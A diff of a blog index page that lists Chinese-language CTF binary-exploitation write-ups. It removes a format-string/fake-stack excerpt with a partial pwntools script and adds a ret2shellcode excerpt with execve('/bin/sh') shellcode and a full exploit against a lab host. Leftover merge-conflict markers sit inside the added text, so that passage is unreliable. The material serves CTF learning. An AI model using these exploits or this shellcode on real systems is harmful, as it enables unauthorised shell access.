@@ -158,32 +158,6 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2>format4_old
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>首先查看保护机制：
-32位程序，开启了栈溢出保护和NX，可以修改got表
-然后我们运行程序，查看程序的内容：
-可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
-根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
-然后我们在IDA中查看文件：
-这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
-现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
-答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
-而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
-所以这道题我们不能直接利用%n修改栈中的值来获得shell。
-那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
-1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
-所以我们还是要泄露程序的libc版本：
-from pwn import *sh = process(&#39;./format4&#39;)#sh = remote(&#39;10.0.25.109&#39;,20004)contact = ELF(&#39;./format4&#39;)#context.log_level = &#39;debug&#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Contact info: \n&#39;)sh.recvuntil(&#39;Name: &#39;)sh.sendline(name)sh.recvuntil(&#39;You have 10 numbers\n&#39;)sh.sendline(phone)sh.recvuntil(&#39;Length of description: &#39;)sh.sendline(descrip_len)sh.recvuntil(&#39;description:\n\t\t&#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;4&#39;)sh.recvuntil(&#39;Contacts:&#39;)sh.recvuntil(&#39;Description: &#39;)printf = 0x08048BD1# get system addr &amp; binsh_addrpayload = &#39;%31$paaaa&#39;createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)printcontact()libc_start_main_ret = int(sh....</p>
-  </div>
-  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to format4_old" href="https://jellyfish-pro.github.io/ctf/format4_old/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
     <h2>ret2csuinit_new
     </h2>
   </header>
@@ -387,6 +361,25 @@ libcbase = write_addr - 0xd44d0system = libcbase &#43; 0x3a950binsh = libcbase
   </div>
   <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
   <a class="entry-link" aria-label="post link to ret2resolve1" href="https://jellyfish-pro.github.io/ctf/ret2resolve1/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2shellcode
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本情况：
+ida中也没有看到system和/bin/sh
+可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：
+在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode
+shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：
+p.recvuntil(&#39;[&#39;) buf_addr = p.recvuntil(&#39;]&#39;,drop=True) 这样就可以计算出存放字符的起始地址
+然后构造payload：
+payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])//‘a’*16：填充字符&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;rbp的填充&#43;shellcode的8位地址=======//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;leave使用掉的8位&#43;shellcode的8位地址//leave = mov esp,ebp;pop ebp&gt;&gt;&gt;&gt;&gt;&gt;&gt; origin/dev #ret2shellcode_x64from pwn import *#p = process(&#34;./ret2shellcode&#34;)p = remote(&#34;10.0.25.109&#34;,10000)shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39;p.recvuntil(&#39;:&#39;)buf_addr = p.recvuntil(&#39;\n&#39;,drop=True)payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])p.sendline(payload)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2shellcode" href="https://jellyfish-pro.github.io/ctf/ret2shellcode/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
